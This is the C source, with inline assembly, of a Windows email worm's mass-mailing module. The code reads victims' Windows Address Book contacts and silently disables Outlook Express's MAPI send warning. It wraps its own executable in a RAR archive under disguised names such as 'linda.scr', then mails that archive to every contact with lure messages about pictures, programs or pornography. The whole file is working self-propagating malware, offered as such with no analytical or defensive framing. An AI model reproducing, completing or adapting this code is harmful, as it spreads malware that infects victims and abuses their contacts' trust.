#include "stdafx.h"
#include "prototypez.h"
#include "mapi.h"
#include "stdlib.h"

//mass mail the worm in rar archive to all poeple
//in the WAB


#define MAX_MAILS		0x50
#define MAX_MAIL_SIZE	0x44

char	MailList[MAX_MAILS][MAX_MAIL_SIZE];
short	NumberOfMails=0;

char *subjects[]={"Re","Resume","Your Files","Your Stuff","My Story"};

char *messages[]={"here are the pictures you asked me to send you.",
				  "please read again what i have written to you !",
				  "here are the programms you asked me to mail you\nfor any help,mail me back",
				   "here are the porn you asked me to show you...",
					"just read it,its fantastic"};

char *attachments[]={"pictures.rar","info.rar","package1.rar","porn.rar","My Life.rar"};
char *xAttachments[]={"pictures_1.exe","mail.scr","musicbox.exe","linda.scr","Story.scr"};

int  nmsg=0;

#define MAX_MESSAGES 5

BOOL MessMail()
{
	HMODULE hmapi;
	
	LPMAPILOGON		xMapiLogOn;
	LPMAPILOGOFF	xMapiLogOff;
	LPMAPISENDMAIL	xMapiSendMail;

	MapiMessage MailMsg;
	MapiFileDesc xAttachment;
	MapiRecipDesc xRcpt;

	HKEY hkey,hkey2;
	char xid[80];
	DWORD xids=sizeof(xid);
	char xfullkey[150];
	DWORD disable_warning=0;
	char wormpath[MAX_PATH];
	char temprar[MAX_PATH];
	int i=0;
	LHANDLE MapiSession;


	if(RegOpenKeyEx(HKEY_CURRENT_USER,"Identities",0,KEY_QUERY_VALUE,&hkey)==ERROR_SUCCESS)
	{
		if(RegQueryValueEx(hkey,"Default User ID",0,NULL,(BYTE *)&xid,&xids)==ERROR_SUCCESS)
		{
			wsprintf(xfullkey,"%s%s",xid,"\\Software\\Microsoft\\Outlook Express\\5.0\\Mail");

			if(RegOpenKeyEx(hkey,xfullkey,0,KEY_WRITE,&hkey2)==ERROR_SUCCESS)
			{
				RegSetValueEx(hkey2,"Warn on Mapi Send",0,REG_DWORD,
					(BYTE *)&disable_warning,sizeof(disable_warning));	//disable MAPI warning

				RegCloseKey(hkey2);
			}
		}
		RegCloseKey(hkey);
	}
	
	hmapi=LoadLibrary("mapi32.dll");	//load mapi libraray

	if(hmapi!=NULL)
	{
		xMapiLogOn=(LPMAPILOGON)GetProcAddress(hmapi,"MAPILogon");
		xMapiLogOff=(LPMAPILOGOFF)GetProcAddress(hmapi,"MAPILogoff");
		xMapiSendMail=(LPMAPISENDMAIL)GetProcAddress(hmapi,"MAPISendMail");

		if(xMapiLogOff==NULL || xMapiLogOff==NULL || xMapiSendMail==NULL)
		{
			FreeLibrary(hmapi);
			return FALSE;
		}
		
		GetModuleFileName(NULL,wormpath,MAX_PATH);

		nmsg=(rand() % MAX_MESSAGES);
		
		GetTempPath(MAX_PATH,temprar);

		lstrcat(temprar,attachments[nmsg]);
	
		AddToRar(temprar,wormpath,xAttachments[nmsg],FILE_ATTRIBUTE_NORMAL);
	
		if(xMapiLogOn(NULL,NULL,NULL,NULL,0,&MapiSession)==SUCCESS_SUCCESS)
		{
			xAttachment.lpszPathName=temprar;
			xAttachment.lpszFileName=attachments[nmsg];
			xAttachment.nPosition=-1;
			xAttachment.ulReserved=0;

			for(i=0;i<NumberOfMails;i++)
			{
				xRcpt.ulRecipClass=MAPI_TO;
				xRcpt.ulReserved=0;
				xRcpt.lpszName=MailList[i];

				MailMsg.nFileCount=1;
				MailMsg.lpszNoteText=messages[nmsg];
				MailMsg.lpszSubject=subjects[nmsg];
				MailMsg.ulReserved=0;
				MailMsg.nRecipCount=1;
				MailMsg.lpRecips=&xRcpt;
				MailMsg.lpFiles=&xAttachment;

				xMapiSendMail(MapiSession,0,&MailMsg,0,0);

			}

			xMapiLogOff(MapiSession,0,0,0);
		}

		FreeLibrary(hmapi);
		return TRUE;
	}
	else
		return FALSE;
}




BOOL GetWABMails()
{
	HKEY hkey;
	char WABFile[MAX_PATH];
	DWORD WF_size=sizeof(WABFile);
	DWORD WF_Type=REG_SZ;
	HANDLE hfile,hmap;
	LPVOID WABase;

	if(RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\WAB\\WAB4\\Wab File Name",
		0,KEY_READ,&hkey)==ERROR_SUCCESS)
	{
		RegQueryValueEx(hkey,"",0,&WF_Type,(BYTE *)WABFile,&WF_size);
		RegCloseKey(hkey);
	}
	else
		return FALSE;

	hfile=CreateFile(WABFile,GENERIC_READ,FILE_SHARE_READ,
		NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

	if(hfile==INVALID_HANDLE_VALUE)
		return FALSE;

	hmap=CreateFileMapping(hfile,NULL,PAGE_READONLY,NULL,NULL,NULL);

	if(hmap==0)
	{
		CloseHandle(hfile);
		return FALSE;
	}
	
	WABase=MapViewOfFile(hmap,FILE_MAP_READ,NULL,
		NULL,NULL);

	if(WABase==NULL)
	{
		CloseHandle(hmap);
		CloseHandle(hfile);
		return FALSE;
	}

	__asm
	{
		mov		eax,[WABase]
		push	word ptr [eax + 64h]
		pop		[NumberOfMails]						;get number of mails
	}

	if(NumberOfMails<=1)
	{
		UnmapViewOfFile(WABase);
		CloseHandle(hmap);
		CloseHandle(hfile);
		return FALSE;
	}

	if(NumberOfMails>MAX_MAILS)
		NumberOfMails=MAX_MAILS;


	__asm
	{
		mov		esi,[WABase]
		movzx	ecx,[NumberOfMails]
		add		esi,[esi + 60h]						;goto start of mails
		lea		edi,MailList
NMail:	push	ecx									;save number of mails
		xor		ebx,ebx
		mov		ecx,MAX_MAIL_SIZE
NxtChar:lodsb										;read one char
		inc		esi
		mov		byte ptr [edi + ebx],al				;save it !
		cmp		byte ptr [esi],0h
		je		MNextMail
		inc		ebx
		dec		ecx
		loop	NxtChar
MNextMail:
		sub		ecx,2h
		add		esi,ecx
		add		edi,MAX_MAIL_SIZE					;move to next field at the array
		pop		ecx		
		loop	NMail								;move to next mail
	}

	UnmapViewOfFile(WABase);
	CloseHandle(hmap);
	CloseHandle(hfile);
	return TRUE;
}

DWORD WINAPI mailworm(LPVOID xvoid)
{
	if(GetWABMails()==TRUE)
		MessMail();
	return 1;
}